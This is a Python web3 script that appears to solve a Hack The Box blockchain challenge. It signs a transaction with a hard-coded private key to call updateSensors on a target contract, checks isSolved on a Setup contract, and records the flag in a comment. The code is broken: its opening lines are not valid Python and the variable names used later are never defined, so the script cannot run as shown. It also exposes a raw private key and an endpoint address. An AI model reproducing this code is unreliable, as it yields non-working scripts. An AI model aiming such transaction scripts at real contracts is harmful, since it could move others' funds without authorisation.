from web3 import Web3
import json

Private key     :  '0x5e7997d7fdeb7ac59215c7619d37c5c522da69739725582b3ef29a040f725aa9'
Address         :  '0x54C23bB8Cdc454D7cF13739404e8FCB6f752F333'
Target contract :  '0x0E6BdcF0f33B74b537f8160eab47D32E44534Ab6'
Setup contract  :  '0x079E941B7287CB55493ECEC66aA451f60cB9DdEB'

w3 = Web3(Web3.HTTPProvider('http://94.237.59.199:56351'))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

#solcjs --abi --bin Setup.sol #generate .abi .bin
#with open('Setup_sol_Setup.abi','r') as f:
#	abi = json.load(f)

#contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
	'private_key': PrivateKey,
	'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#	{
#		'from': account_from['address'],
#		'nonce': w3.eth.get_transaction_count(account_from['address']),
#	}
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

with open('Unknown_sol_Unknown.abi','r') as f:
	abi = json.load(f)
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.updateSensors(10).build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
		'chainId': w3.eth.chain_id,
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

updated = contract_instance2.functions.updated().call()
print('updated:', updated)

with open('Setup_sol_Setup.abi','r') as f:
        abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')

#FLAG=HTB{9P5_50FtW4R3_UPd4t3D}
